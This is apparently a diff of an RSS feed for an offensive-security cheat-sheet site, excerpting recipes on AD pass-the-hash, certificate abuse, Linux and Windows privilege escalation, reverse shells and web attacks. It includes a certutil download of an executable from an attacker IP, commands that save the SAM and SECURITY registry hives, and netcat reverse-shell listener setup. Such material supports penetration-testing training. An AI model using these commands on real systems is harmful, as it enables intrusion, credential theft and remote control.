+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Remote SAM + LSA dump (local admin needed) # When you&amp;rsquo;re local admin on any host (not DC), secretsdump pulls the local SAM, LSA secrets, cached domain creds:</description></item><item><title>Web Cache Poisoning</title><link>https://jinpwn.dev/cheatsheets/web/web11-web-cache-poisoning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web11-web-cache-poisoning/</guid><description>The cache stores attacker-controlled content under a victim-accessible URL. One request poisons the cache, all subsequent visitors get the malicious response.
 T=https://target.com i. Where it lives # Anywhere there&amp;rsquo;s a cache between users and the origin:
-CDNs (Cloudflare, Akamai, Fastly, CloudFront, Edgecast) Reverse proxies with caching (Varnish, nginx with proxy_cache, HAProxy) Application-layer cache (Redis-backed page cache, full-page application caches) ESI (Edge Side Includes) processors Detect a cache:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Services &amp; Sockets</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/09-privesc---services--sockets/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/09-privesc---services--sockets/</guid>
-      <description>09 PrivEsc - Services &amp;amp; Sockets Services running as root, sockets you can talk to, group memberships that grant root access.
+CDNs (Cloudflare, Akamai, Fastly, CloudFront, Edgecast) Reverse proxies with caching (Varnish, nginx with proxy_cache, HAProxy) Application-layer cache (Redis-backed page cache, full-page application caches) ESI (Edge Side Includes) processors Detect a cache:</description></item><item><title>PrivEsc - Services &amp; Sockets</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/09-privesc---services--sockets/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/09-privesc---services--sockets/</guid><description>09 PrivEsc - Services &amp;amp; Sockets Services running as root, sockets you can talk to, group memberships that grant root access.
 i. Enumerate # Services running as root:
 ps -eo user,pid,cmd | awk &amp;#39;$1==&amp;#34;root&amp;#34;&amp;#39; | sort -u systemctl list-units --type=service --state=running Internal listening sockets, often have weaker auth:
 ss -tlnp | grep &amp;#39;127.0.0.1\|::1&amp;#39; ss -xlnp ## unix domain sockets ls -la /var/run/*.sock /tmp/*.sock /run/*.sock 2&amp;gt;/dev/null Groups you belong to:
-id ## Look for: docker, lxd, lxc, disk, video, adm, sudo, wheel, sys ii. Group-based privesc # docker group, instant root, you don&amp;rsquo;t need sudo:
-</description>
-    </item>
-    <item>
-      <title>LOLBAS</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w09-lolbas/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w09-lolbas/</guid>
-      <description>Living Off the Land Binaries And Scripts. Windows ships with signed Microsoft binaries that can download, execute, persist, and bypass restrictions. The full catalog is at lolbas-project.github.io .
+id ## Look for: docker, lxd, lxc, disk, video, adm, sudo, wheel, sys ii. Group-based privesc # docker group, instant root, you don&amp;rsquo;t need sudo:</description></item><item><title>LOLBAS</title><link>https://jinpwn.dev/cheatsheets/windows/w09-lolbas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w09-lolbas/</guid><description>Living Off the Land Binaries And Scripts. Windows ships with signed Microsoft binaries that can download, execute, persist, and bypass restrictions. The full catalog is at lolbas-project.github.io .
 Why care: signed by Microsoft = passes AV signature checks, often allowed by AppLocker / WDAC, blends into legitimate admin behavior.
 i. Download a file # certutil, the classic:
-certutil -urlcache -split -f http://10.10.14.1/sh.exe C:\Windows\Temp\sh.exe ## Sometimes flagged by Defender now, use -urlfetch for older boxes: certutil -urlfetch http://10.10.14.1/sh.exe C:\Windows\Temp\sh.exe bitsadmin:
-</description>
-    </item>
-    <item>
-      <title>Lateral Movement</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</guid>
-      <description>AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .
+certutil -urlcache -split -f http://10.10.14.1/sh.exe C:\Windows\Temp\sh.exe ## Sometimes flagged by Defender now, use -urlfetch for older boxes: certutil -urlfetch http://10.10.14.1/sh.exe C:\Windows\Temp\sh.exe bitsadmin:</description></item><item><title>Lateral Movement</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad10-lateral-movement/</guid><description>AD-specific lateral movement: Pass-the-Hash, Pass-the-Ticket, Overpass-the-Hash, Kerberos abuse. For the impacket/nxc tool mechanics, see Lateral Movement .
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; NTHASH=&amp;#39;8846f7eaee8fb117ad06bdd830b7586c&amp;#39; AESKEY=&amp;#39;b8f62a5f9ba0c8d3e7a2c1b4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4&amp;#39; i. Pass-the-Hash (PtH) # Use an NTLM hash as if it were a password. Works for any NTLM-based service.
-nxc smb $DC -u $USER -H $NTHASH nxc winrm $DC -u $USER -H $NTHASH impacket-psexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC impacket-wmiexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC evil-winrm -i $DC -u $USER -H $NTHASH RDP with PtH needs Restricted Admin Mode on the target:
-</description>
-    </item>
-    <item>
-      <title>Request Smuggling</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web10-request-smuggling/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web10-request-smuggling/</guid>
-      <description>Front-end and back-end servers disagree on where one request ends and the next begins. Hijack other users&amp;rsquo; requests, bypass auth, poison caches.
+nxc smb $DC -u $USER -H $NTHASH nxc winrm $DC -u $USER -H $NTHASH impacket-psexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC impacket-wmiexec -hashes :$NTHASH &amp;#34;$DOMAIN/$USER&amp;#34;@$DC evil-winrm -i $DC -u $USER -H $NTHASH RDP with PtH needs Restricted Admin Mode on the target:</description></item><item><title>Request Smuggling</title><link>https://jinpwn.dev/cheatsheets/web/web10-request-smuggling/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web10-request-smuggling/</guid><description>Front-end and back-end servers disagree on where one request ends and the next begins. Hijack other users&amp;rsquo; requests, bypass auth, poison caches.
 T=https://target.com i. Where it lives # Anywhere there&amp;rsquo;s a chain of HTTP proxies / load balancers / CDNs in front of the app:
-CloudFront / Akamai / Cloudflare / Fastly in front of origin nginx / HAProxy / AWS ALB → application server Reverse proxy with web cache (Varnish) WAF appliances doing buffering before forward API gateway → microservice The vuln is in the disagreement between two HTTP parsers. Different software products handle edge cases differently in:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Kernel &amp; Exploits</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/</guid>
-      <description>Last resort on Windows, same rule as Linux: try W03-W07 first. Kernel exploits can BSOD a box.
+CloudFront / Akamai / Cloudflare / Fastly in front of origin nginx / HAProxy / AWS ALB → application server Reverse proxy with web cache (Varnish) WAF appliances doing buffering before forward API gateway → microservice The vuln is in the disagreement between two HTTP parsers. Different software products handle edge cases differently in:</description></item><item><title>PrivEsc - Kernel &amp; Exploits</title><link>https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w08-privesc---kernel--exploits/</guid><description>Last resort on Windows, same rule as Linux: try W03-W07 first. Kernel exploits can BSOD a box.
 i. Get the patch state # systeminfo &amp;gt; si.txt type si.txt | findstr /B /C:&amp;#34;OS Name&amp;#34; /C:&amp;#34;OS Version&amp;#34; /C:&amp;#34;System Type&amp;#34; type si.txt | findstr /N &amp;#34;KB&amp;#34; Note: systeminfo lists installed hotfixes. Missing patches = exploit candidates.
 PowerShell:
-Get-HotFix | Sort-Object -Descending InstalledOn | Select-Object HotFixID,InstalledOn -First 30 ii. Run a suggester # wesng (Windows-Exploit-Suggester-NG, the modern one):
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Capabilities</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/08-privesc---capabilities/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/08-privesc---capabilities/</guid>
-      <description>08 PrivEsc - Capabilities Linux capabilities split root powers into pieces. A binary with the wrong cap = privesc.
+Get-HotFix | Sort-Object -Descending InstalledOn | Select-Object HotFixID,InstalledOn -First 30 ii. Run a suggester # wesng (Windows-Exploit-Suggester-NG, the modern one):</description></item><item><title>PrivEsc - Capabilities</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/08-privesc---capabilities/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/08-privesc---capabilities/</guid><description>08 PrivEsc - Capabilities Linux capabilities split root powers into pieces. A binary with the wrong cap = privesc.
 i. Enumerate # getcap -r / 2&amp;gt;/dev/null getcap -r / 2&amp;gt;/dev/null | grep -v &amp;#39;^/snap&amp;#39; ## filter snap noise Per-file check:
 getcap /usr/bin/python3 Process capabilities (running services):
-cat /proc/self/status | grep Cap ## Decode CapEff: capsh --decode=00000000a80425fb ii. Dangerous capabilities and how to abuse # cap_setuid+ep, can setuid() to any UID, instant root:
-</description>
-    </item>
-    <item>
-      <title>ADCS ESC1-16</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</guid>
-      <description>Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.
+cat /proc/self/status | grep Cap ## Decode CapEff: capsh --decode=00000000a80425fb ii. Dangerous capabilities and how to abuse # cap_setuid+ep, can setuid() to any UID, instant root:</description></item><item><title>ADCS ESC1-16</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad09-adcs-esc1-16/</guid><description>Active Directory Certificate Services misconfigurations, ESC1 through ESC16. Certipy v5 covers detection and exploitation for almost all of them.
 DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; CA=&amp;#39;CORP-CA&amp;#39; CA_HOST=&amp;#39;ca.corp.local&amp;#39; i. Enumerate # Certipy find shows everything: templates, CA config, vulnerabilities flagged per template:
-certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout ## Just vulnerable ones, less noise: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -vulnerable ## Hide admin permissions to reduce output: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -hide-admins -vulnerable ## Save full output to JSON + TXT for reference: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC ## Output: YYYYMMDDHHMMSS_Certipy.json + _Certipy.txt + _Certipy.zip (BloodHound import) Drop the zip into BloodHound, certipy adds ADCSESC1 through ADCSESC16 edges automatically.
-</description>
-    </item>
-    <item>
-      <title>WEB09 CSRF &amp; CORS</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/</guid>
-      <description>Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.
+certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout ## Just vulnerable ones, less noise: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -vulnerable ## Hide admin permissions to reduce output: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -hide-admins -vulnerable ## Save full output to JSON + TXT for reference: certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC ## Output: YYYYMMDDHHMMSS_Certipy.json + _Certipy.txt + _Certipy.zip (BloodHound import) Drop the zip into BloodHound, certipy adds ADCSESC1 through ADCSESC16 edges automatically.</description></item><item><title>WEB09 CSRF &amp; CORS</title><link>https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web09-csrf--cors/</guid><description>Two related bugs around cross-origin requests. CSRF lets attacker pages make state-changing requests as the victim. CORS misconfigs let attacker pages read sensitive responses cross-origin.
 T=https://target.com i. Where it lives # CSRF surfaces:
-Any state-changing endpoint (POST, PUT, DELETE, PATCH) Password / email change forms Funds transfer / payment Admin actions &amp;ldquo;Add to cart&amp;rdquo; / &amp;ldquo;place order&amp;rdquo; Account deletion API key generation CORS surfaces:
-</description>
-    </item>
-    <item>
-      <title>UAC Bypass</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w07-uac-bypass/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w07-uac-bypass/</guid>
-      <description>When you have an Administrator account but only a medium-integrity shell. UAC bypass elevates without a prompt.
+Any state-changing endpoint (POST, PUT, DELETE, PATCH) Password / email change forms Funds transfer / payment Admin actions &amp;ldquo;Add to cart&amp;rdquo; / &amp;ldquo;place order&amp;rdquo; Account deletion API key generation CORS surfaces:</description></item><item><title>UAC Bypass</title><link>https://jinpwn.dev/cheatsheets/windows/w07-uac-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w07-uac-bypass/</guid><description>When you have an Administrator account but only a medium-integrity shell. UAC bypass elevates without a prompt.
 i. Where you stand # UAC only matters if you&amp;rsquo;re already in the local Administrators group. Confirm:
 whoami /groups | findstr /i &amp;#34;S-1-5-32-544\|Administrators&amp;#34; Check current integrity:
-whoami /groups | findstr /i &amp;#34;Mandatory Label&amp;#34; ## &amp;#34;High Mandatory Level&amp;#34; = elevated, no bypass needed ## &amp;#34;Medium Mandatory Level&amp;#34; = needs UAC bypass Check UAC config:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Cron &amp; Timers</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/07-privesc---cron--timers/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/07-privesc---cron--timers/</guid>
-      <description>Scheduled tasks running as root. The classic Insane-box privesc lives here. Run pspy from 05 Local Enum first.
+whoami /groups | findstr /i &amp;#34;Mandatory Label&amp;#34; ## &amp;#34;High Mandatory Level&amp;#34; = elevated, no bypass needed ## &amp;#34;Medium Mandatory Level&amp;#34; = needs UAC bypass Check UAC config:</description></item><item><title>PrivEsc - Cron &amp; Timers</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/07-privesc---cron--timers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/07-privesc---cron--timers/</guid><description>Scheduled tasks running as root. The classic Insane-box privesc lives here. Run pspy from 05 Local Enum first.
 i. Enumerate # cat /etc/crontab cat /etc/anacrontab ls -la /etc/cron.d/ /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly crontab -l 2&amp;gt;/dev/null ls -la /var/spool/cron/crontabs/ 2&amp;gt;/dev/null cat /var/spool/cron/crontabs/* 2&amp;gt;/dev/null systemctl list-timers --all ls -la /etc/systemd/system/*.timer 2&amp;gt;/dev/null Catch dynamic / per-user / non-cron schedulers:
-ps -ef | grep -E &amp;#39;cron|atd|anacron&amp;#39; ls -la /var/spool/at/ 2&amp;gt;/dev/null ii. pspy is the catch-all # Static enum misses things that get added at runtime. Always run pspy for 5+ minutes:
-</description>
-    </item>
-    <item>
-      <title>Delegation</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</guid>
-      <description>Kerberos delegation lets one principal act on behalf of another. Three flavors, each with its own attack:
-Unconstrained: act as anyone, anywhere. Most dangerous, less common today. Constrained: act as anyone, but only to specific services. RBCD (Resource-Based Constrained Delegation): the cleanest path. The TARGET resource defines who can delegate to it. DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find delegation surfaces # BloodHound has dedicated queries: &amp;ldquo;Find Unconstrained Delegation Computers&amp;rdquo;, &amp;ldquo;Find Computers with Constrained Delegation&amp;rdquo;, &amp;ldquo;Find Computers with RBCD&amp;rdquo;.
-</description>
-    </item>
-    <item>
-      <title>XXE</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web07-xxe/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web07-xxe/</guid>
-      <description>XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.
+ps -ef | grep -E &amp;#39;cron|atd|anacron&amp;#39; ls -la /var/spool/at/ 2&amp;gt;/dev/null ii. pspy is the catch-all # Static enum misses things that get added at runtime. Always run pspy for 5+ minutes:</description></item><item><title>Delegation</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad08-delegation/</guid><description>Kerberos delegation lets one principal act on behalf of another. Three flavors, each with its own attack:
+Unconstrained: act as anyone, anywhere. Most dangerous, less common today. Constrained: act as anyone, but only to specific services. RBCD (Resource-Based Constrained Delegation): the cleanest path. The TARGET resource defines who can delegate to it. DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; i. Find delegation surfaces # BloodHound has dedicated queries: &amp;ldquo;Find Unconstrained Delegation Computers&amp;rdquo;, &amp;ldquo;Find Computers with Constrained Delegation&amp;rdquo;, &amp;ldquo;Find Computers with RBCD&amp;rdquo;.</description></item><item><title>XXE</title><link>https://jinpwn.dev/cheatsheets/web/web07-xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web07-xxe/</guid><description>XML External Entity injection. User-supplied XML is parsed with external entities enabled. Read files, SSRF, sometimes RCE.
 T=https://target.com i. Where it lives # XML parsers are everywhere, often hidden:
 Obvious:
-SOAP endpoints REST APIs accepting Content-Type: application/xml or text/xml RSS / Atom feed readers WebDAV endpoints XML-RPC interfaces (often at /xmlrpc.php) Hidden inside other formats (every modern Office doc is a zip of XML):
-</description>
-    </item>
-    <item>
-      <title>XSS</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web08-xss/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web08-xss/</guid>
-      <description>User input rendered as HTML / JavaScript without proper escaping. Session theft, account takeover, internal recon via XHR.
+SOAP endpoints REST APIs accepting Content-Type: application/xml or text/xml RSS / Atom feed readers WebDAV endpoints XML-RPC interfaces (often at /xmlrpc.php) Hidden inside other formats (every modern Office doc is a zip of XML):</description></item><item><title>XSS</title><link>https://jinpwn.dev/cheatsheets/web/web08-xss/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web08-xss/</guid><description>User input rendered as HTML / JavaScript without proper escaping. Session theft, account takeover, internal recon via XHR.
 T=https://target.com i. Where it lives # Three flavors, each with different testing approach:
 Reflected XSS - input goes into one response only, requires victim to click attacker&amp;rsquo;s link.
-Search queries, error messages, URL params echoed in page Stored XSS - input persists in DB, fires for every viewer of that data.
-</description>
-    </item>
-    <item>
-      <title>Reverse Shells</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</guid>
-      <description>Listener first, then the callback. Set attacker IP and port once:
+Search queries, error messages, URL params echoed in page Stored XSS - input persists in DB, fires for every viewer of that data.</description></item><item><title>Reverse Shells</title><link>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/misc/reverse-shells/</guid><description>Listener first, then the callback. Set attacker IP and port once:
 LHOST=10.10.14.1 LPORT=4444 i. Pick a listener # Plain netcat, no frills:
 nc -lvnp &amp;#34;$LPORT&amp;#34; ncat, supports SSL and multiple clients:
 ncat -lvnp &amp;#34;$LPORT&amp;#34; ncat -lvnp &amp;#34;$LPORT&amp;#34; --ssl ## TLS listener for openssl/curl callbacks ncat -lvnp &amp;#34;$LPORT&amp;#34; --keep-open ## accept multiple connections pwncat-cs, stable PTY + upload/download out of the box, skip the stty dance:
-pwncat-cs -lp &amp;#34;$LPORT&amp;#34; ## If it hangs at &amp;#34;registered new host&amp;#34;, Ctrl-C then type &amp;#39;back&amp;#39; ii. Bash one-liners # The /dev/tcp trick, most common:
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - SUID &amp; Sudo</title>
-      <link>https://jinpwn.dev/cheatsheets/linux-pentesting/06-privesc---suid--sudo/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/linux-pentesting/06-privesc---suid--sudo/</guid>
-      <description>Cheapest privesc paths. Always check these first after 05 Local Enum .
+pwncat-cs -lp &amp;#34;$LPORT&amp;#34; ## If it hangs at &amp;#34;registered new host&amp;#34;, Ctrl-C then type &amp;#39;back&amp;#39; ii. Bash one-liners # The /dev/tcp trick, most common:</description></item><item><title>PrivEsc - SUID &amp; Sudo</title><link>https://jinpwn.dev/cheatsheets/linux-pentesting/06-privesc---suid--sudo/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/linux-pentesting/06-privesc---suid--sudo/</guid><description>Cheapest privesc paths. Always check these first after 05 Local Enum .
 i. Enumerate # sudo -l 2&amp;gt;/dev/null find / -perm -4000 -type f 2&amp;gt;/dev/null find / -perm -4000 -type f -exec ls -la {} \; 2&amp;gt;/dev/null ## SGID (root group, less common but useful): find / -perm -2000 -type f 2&amp;gt;/dev/null Diff against a known-clean install to find custom SUIDs:
-find / -perm -4000 -type f 2&amp;gt;/dev/null | sort &amp;gt; suid.txt ## known defaults on Ubuntu/Debian: passwd, su, mount, umount, sudo, pkexec, chsh, chfn, newgrp diff &amp;lt;(cat suid.txt) &amp;lt;(echo -e &amp;#34;/usr/bin/passwd\n/usr/bin/su\n/usr/bin/sudo\n...&amp;#34;) ii. GTFOBins workflow # Take any SUID or sudo entry, check GTFOBins . If it&amp;rsquo;s listed under SUID or Sudo, follow the recipe.
-</description>
-    </item>
-    <item>
-      <title>PrivEsc - Credentials &amp; Files</title>
-      <link>https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/</guid>
-      <description>Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.
+find / -perm -4000 -type f 2&amp;gt;/dev/null | sort &amp;gt; suid.txt ## known defaults on Ubuntu/Debian: passwd, su, mount, umount, sudo, pkexec, chsh, chfn, newgrp diff &amp;lt;(cat suid.txt) &amp;lt;(echo -e &amp;#34;/usr/bin/passwd\n/usr/bin/su\n/usr/bin/sudo\n...&amp;#34;) ii. GTFOBins workflow # Take any SUID or sudo entry, check GTFOBins . If it&amp;rsquo;s listed under SUID or Sudo, follow the recipe.</description></item><item><title>PrivEsc - Credentials &amp; Files</title><link>https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/windows/w06-privesc---credentials--files/</guid><description>Credentials lying on the box. The most reliable Windows privesc when the privileges and services come up clean.
 i. SAM, SYSTEM, SECURITY hives # Locked while Windows is running. Need SeBackup, admin, or HiveNightmare (CVE-2021-36934).
 With SeBackupPrivilege (covered in PrivEsc - Tokens &amp;amp; Privileges ):
-reg save HKLM\SAM C:\Windows\Temp\SAM reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM reg save HKLM\SECURITY C:\Windows\Temp\SECURITY HiveNightmare (any non-admin, Win10 1809+ to early 2021 patch):
-</description>
-    </item>
-    <item>
-      <title>ACL Abuse</title>
-      <link>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</guid>
-      <description>When BloodHound shows you write access on an object, this file is the recipe book. bloodyAD covers most of these in one command per edge.
-DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; Find your edges fast Before reading this file, run bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get writable --bh and load the result into BloodHound. It shows you every object you can touch and the exact rights you have.
-</description>
-    </item>
-    <item>
-      <title>SSTI</title>
-      <link>https://jinpwn.dev/cheatsheets/web/web06-ssti/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/web/web06-ssti/</guid>
-      <description>User input rendered through a server-side template engine. Almost always escalates to RCE.
+reg save HKLM\SAM C:\Windows\Temp\SAM reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM reg save HKLM\SECURITY C:\Windows\Temp\SECURITY HiveNightmare (any non-admin, Win10 1809+ to early 2021 patch):</description></item><item><title>ACL Abuse</title><link>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/active-directory/ad07-acl-abuse/</guid><description>When BloodHound shows you write access on an object, this file is the recipe book. bloodyAD covers most of these in one command per edge.
+DC=10.10.11.50 DOMAIN=corp.local USER=&amp;#39;svc_user&amp;#39; PASS=&amp;#39;Password1&amp;#39; Find your edges fast Before reading this file, run bloodyAD -d $DOMAIN -u $USER -p $PASS --host $DC get writable --bh and load the result into BloodHound. It shows you every object you can touch and the exact rights you have.</description></item><item><title>SSTI</title><link>https://jinpwn.dev/cheatsheets/web/web06-ssti/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://jinpwn.dev/cheatsheets/web/web06-ssti/</guid><description>User input rendered through a server-side template engine. Almost always escalates to RCE.
 T=https://target.com i. Where it lives # Anywhere the app puts user input into a templated output:
-Profile fields displayed on a &amp;ldquo;welcome, {name}&amp;rdquo; page Email templates (&amp;ldquo;Hi {firstname}&amp;rdquo;) Error pages echoing user input Search results that personalize the page Generated PDF reports (often Jinja2 / wkhtmltopdf) Wiki / CMS preview features Notification messages Admin-configurable templates exposed via UI Signal that you&amp;rsquo;re dealing with templating, not just reflection:
-</description>
-    </item>
-    <item>
-      <title>Recon (external)</title>
-      <link>https://jinpwn.dev/cheatsheets/misc/recon-external/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 &#43;0000</pubDate>
-      <guid>https://jinpwn.dev/cheatsheets/misc/recon-external/</guid>
-      <description>External attack surface discovery. Domain in scope, find what is exposed. For internal host enum use 01 Recon &amp;amp; Enum .
